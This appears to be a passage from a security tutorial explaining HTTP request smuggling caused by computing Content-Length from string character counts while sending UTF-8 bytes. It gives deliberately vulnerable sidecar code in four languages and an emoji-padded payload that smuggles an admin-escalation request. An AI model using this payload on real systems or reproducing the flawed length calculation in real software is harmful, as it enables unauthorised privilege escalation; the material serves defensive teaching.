            var contentLength = jsonPayload.Length; 

            // [4]
            var rawRequest = $"POST /api/v1/audit/ingest HTTP/1.1\r\n" +
                             $"Host: central-audit.internal.corp\r\n" +
                             $"Content-Length: {contentLength}\r\n\r\n" +
                             $"{jsonPayload}";

            var buffer = Encoding.UTF8.GetBytes(rawRequest);
            await _auditStream.WriteAsync(buffer, 0, buffer.Length);
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class TelemetryBatchSidecar {

    private OutputStream auditStream;
    private ObjectMapper mapper;

    public void flushBatch(List<AuditLog> logs) throws Exception {
        for (AuditLog log : logs) {
            String jsonPayload = mapper.writeValueAsString(log);
            
            // [1]
            // [2]
            // [3]
            int contentLength = jsonPayload.length(); 

            // [4]
            String rawRequest = 
                "POST /api/v1/audit/ingest HTTP/1.1\r\n" +
                "Host: central-audit.internal.corp\r\n" +
                "Content-Length: " + contentLength + "\r\n\r\n" +
                jsonPayload;

            auditStream.write(rawRequest.getBytes(StandardCharsets.UTF_8));
        }
        auditStream.flush();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class TelemetryBatchSidecar 
{
    protected $auditStream;

    public function flushBatch(array $logs): void 
    {
        foreach ($logs as $log) 
        {
            $jsonPayload = json_encode($log);
            
            // [1]
            // [2]
            // [3]
            // Developer explicitly uses mb_strlen assuming it is "safer" for multibyte APIs.
            $contentLength = mb_strlen($jsonPayload, 'UTF-8');

            // [4]
            $rawRequest = "POST /api/v1/audit/ingest HTTP/1.1\r\n" .
                          "Host: central-audit.internal.corp\r\n" .
                          "Content-Length: {$contentLength}\r\n\r\n" .
                          "{$jsonPayload}";

            fwrite($this->auditStream, $rawRequest);
        }
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class TelemetryBatchSidecar {
    static async flushBatch(logs) {
        for (let log of logs) {
            let jsonPayload = JSON.stringify(log);
            
            // [1]
            // [2]
            // [3]
            let contentLength = jsonPayload.length; // Counts UTF-16 code units, not UTF-8 bytes

            // [4]
            let rawRequest = 
                `POST /api/v1/audit/ingest HTTP/1.1\r\n` +
                `Host: central-audit.internal.corp\r\n` +
                `Content-Length: ${contentLength}\r\n\r\n` +
                `${jsonPayload}`;

            auditSocket.write(rawRequest, 'utf8');
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The system utilizes an internal sidecar to aggregate and pipeline massive volumes of JSON telemetry over a single persistent TCP socket, drastically reducing TLS and handshake overhead, \[2] To maximize performance, the developer avoids constructing heavy HTTP Client objects, instead formatting raw HTTP/1.1 protocol strings manually, \[3] The architecture fundamentally misunderstands byte-level encoding. The developer calculates the `Content-Length` using the native string property (`.Length`, `.length`, `mb_strlen`). These functions return the character count (or code units), \[4] The fatal pipeline desynchronization. Because the socket writer encodes the string into UTF-8 before transmitting, a 1-character Emoji transforms into 4 physical bytes. If the attacker pads the payload with multi-byte characters, the calculated `Content-Length` header becomes significantly smaller than the actual byte stream sent over the wire. The downstream server stops reading early, perfectly staging the trailing bytes (the attacker's smuggled request) to be parsed as the next pipelined HTTP frame

```
// 1. Attacker interacts with a standard endpoint that generates an Audit Event (e.g., updating a profile name).
// 2. Attacker crafts a payload containing multi-byte characters to offset the Content-Length calculation, 
// followed by the HTTP Request Smuggling payload.

POST /api/v1/profile/update HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "displayName": "🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀\r\n\r\nPOST /internal/admin/escalate HTTP/1.1\r\nHost: central-audit.internal.corp\r\nContent-Length: 17\r\n\r\n{\"role\":\"admin\"}"
}

// 3. The Sidecar builds the JSON payload: 
// {"user":"attacker","name":"🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀\r\n\r\nPOST /internal/admin/escalate HTTP/1.1\r\nHost: central-audit.internal.corp\r\nContent-Length: 17\r\n\r\n{\"role\":\"admin\"}"}

// 4. The Sidecar calculates the String Length (e.g., 150 characters) but writes UTF-8 bytes (e.g., 180 bytes) to the TCP stream.
// 5. The Central Audit server consumes EXACTLY 150 bytes, ending its parsing exactly before the smuggled POST payload.
// 6. The Central Audit server immediately encounters the trailing bytes resting in the TCP buffer:
// POST /internal/admin/escalate HTTP/1.1
// Host: central-audit.internal.corp ...

// 7. The Central Audit server executes the smuggled request, elevating the attacker's privileges entirely out-of-band.
```
{% endstep %}

{% step %}
To eliminate the extreme overhead of managing millions of discrete HTTP connections, DevOps engineers designed a localized sidecar proxy that batched JSON telemetry over an asynchronous, persistent HTTP/1.1 pipeline. The architecture manually generated the HTTP framing to maximize local CPU efficiency. However, developers implemented an Encoding Asymmetry: they calculated the `Content-Length` boundary using logical string character counts, but transmitted the data using UTF-8 byte encoding. The attacker exploited this mathematical discrepancy by injecting multi-byte Unicode characters into their telemetry event, artificially shrinking the declared `Content-Length` relative to the physical byte size. The downstream aggregator server strictly adhered to the faulty `Content-Length`, truncating its parsing process early. The trailing bytes, containing the attacker's perfectly formed secondary HTTP request, were abandoned in the Keep-Alive TCP buffer, seamlessly desynchronizing the pipeline and executing unauthenticated requests deep within the central network infrastructure
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
